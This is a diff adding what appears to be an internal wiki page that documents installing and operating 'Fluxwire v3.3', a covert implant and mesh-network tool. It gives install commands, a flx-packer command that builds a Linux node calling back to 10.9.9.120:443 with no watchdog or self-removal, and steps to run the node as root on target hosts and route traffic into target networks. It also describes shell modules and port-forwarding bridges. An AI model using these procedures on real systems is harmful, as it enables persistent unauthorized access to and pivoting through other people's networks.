@@ -1,0 +1,149 @@
+
+                        Owner: User #14587612
+Setup Fluxwire v3.3
+When setting up a test, verify with the operator how they intend to throw a tool and/or exploit.  Most of the time this is via fluxwire.  Flux can introduce odd network behavior so it's good to verify tool behavior with it.
+The installed components are:
+
+flx-desktop: the Control instance.  Listens for incoming Node connections and flx-gui instances
+flx-gui: the interface to the Control instance that allows you to manage all the nodes on the mesh network.  Mutliple flx-gui instances can connect to a single flx-desktop
+flx-packer: cmd line utility to create a Node to run on a host.  Use flx-packer -s ? to get a list of supported target architectures for Nodes
+flx-manager: manages the installed instances of fluxwire.  
+
+Install and Configure v3.3
+As of 2015-05-12, this is the version COGComputer Operations Group uses on ICON (Debian VMs).  Legacy ICON machines are Ubuntu 12.04, and they use Flux v3.2.1, which uses a different install process.
+
+From Devlan share, get flx_v3.3.0.zip
+On the ICON Linux VM, unzip the files: unzip flx_v3.3.0.zip
+
+cd BIN/Unclassified_FOUO/Fluxwire_Binaries/3.3.0
+sudo python install.py
+
+cp BIN/Unclassified_FOUO/Fluxwire_Binaries/3.3.0/confs/linux-fluxwire.conf <test directory>
+
+Open linux-fluxwire.conf in a text editor and make the following changes:
+Under "desktop" -> "clients", change the port to whatever you want the desktop instance to listen on for connections from the flx-gui
+Under "device" -> "stacks": 
+Change the mtu to match the value used by the operator.  
+Change the key if desired.  You will supply this value to the Nodes when using flx-packer.
+Change the ports used if desired.  This will be the ports that flx-desktop will listen on for incoming connections from Nodes
+
+
+Save the file
+
+
+
+May be needed: The python install script did not copy the required libraries correctly when I installed it.  
+On Debian, you get the error "libconfig.so.9.1.3 too short".  To fix this, perform the following:
+
+cp BIN/Unclassified_FOUO/Fluxwire_Binaries/3.3.0/deps/libconfig.so.9.1.3  /usr/lib/libconfig.so.9.1.3 
+
+Setup symlinks if needed
+
+
+
+When using Ubuntu, you may receive others errors.  Below are the fixes for each error.
+Error: 
+
+To fix the above error, perform the following:
+sudo rm /usr/lib/libprotobuf-c.so.0
+sudo ln -s /usr/lib/libprotobuf-c.so.0.0.0  /usr/lib/libprotobuf-c.so.0
+
+
+Error: 
+
+To fix the above error, perform the following:
+sudo rm libconfig.so.9
+sudo ln -s /usr/lib/libconfig.so.9.1.3  /usr/lib/libconfig.so.9
+
+
+
+
+
+
+Start the Control instance: sudo flx-desktop linux-fluxwire.conf
+
+Using flx-packer, create the Nodes required for your op.  For example, the following command will create a Linux x64 node that will call back to 10.9.9.120:443 with an mtu of 1250 bytes and will never timeout or autoremove itself.
+flx-packer -s linux:x64 -o linux-node -k aaaaaaaaaaaaaaaa --link "ip4=10.9.9.120 tcp=443 watchdog=0:0" -m 1250
+See flx-packer --help for more information on the arguments.  
+
+
+
+Run your Node(s) from step 9 on the flux target hosts
+Copy linux-node file to Target Flux VM
+As root, run ./linux-node
+
+
+
+On the ICON VMVirtual Machine - Open the GUI: flx-gui
+Supply the port from step 6a and the key from step 6b
+Click the Connect button to connect to the Control instance
+
+
+You should see your Node(s) connected to the mesh in the Network window.
+Right-click a node and select Transport -> Gateway
+
+Add routes so that traffic destined from your ICON VMVirtual Machine to the target network will be routed through the correct Node.The default gateway for the routes will be 192.168.88.2
+
+You should now be able to send traffic (e.g. IACInternational Access Code) routed through the flux mesh network to the target network
+
+ 
+
+
+Flux does not work with ICMPInternet Control Message Protocol traffic; do not use ping to verify flux connectivity
+You may also need to setup Bridges in the Transport window, depending on your requirements. Bridges allow you to do port forwarding from a Node back to your ICON workstation. Refer to the flux documentation for more info.
+
+TFTP and Flux
+TFTP clients connect to servers listening on port 69, and the server will reply with data using a randomly chosen ephemeral port as the src port. This confuses flux, as it expects the server to reply from port 69
+To workaround this, run the TFTPFile transfer software server with a pre-defined port range. For example, if you use tftpd-hpa, edit /etc/default/tftpd-hpa: TFTP_OPTIONS="--secure --port-range 2000:2005". Restart tftpd-hpa.
+Setup Bridges to forward UDPUser Datagram Protocol traffic on these ports back to your ICON VM. Don't forget a bridge for traffic from UDPUser Datagram Protocol 69, otherwise your server will never see the initial TFTPFile transfer software Read packet from the client
+
+
+
+FTP and Flux
+Similar to TFTP, FTPFile Transfer Protocol needs configured to work with flux
+/etc/vsftpd.conf
+pasv_enable=Yes
+pasv_min_port=10000 (anything > 1024)
+pasv_max_port=10010 (anything > 1024)
+
+service vsftpd restart
+
+
+Setup bridge for 21 tcp back to your ICON VM
+May need to do additional bridges for 10000 - 10010 back to ICON VM
+
+
+There are a number of modules you can load on the target Node (e.g. shell). You can configure these by righ-click on the node in the Network window: Device -> Configure, then select the green moudules icon.
+
+ 
+
+Related articles
+
+Related articles appear here based on the labels you select. Click to edit the macro and add or change labels.
+
+('contentbylabel' missing)
+Install Fluxwire v2.3  
+('details' missing)
+
+Attachments:
+
+
+image2015-5-18 10:48:27.png
+
+
+image2015-5-18 10:43:44.png
+
+
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+|
+                    
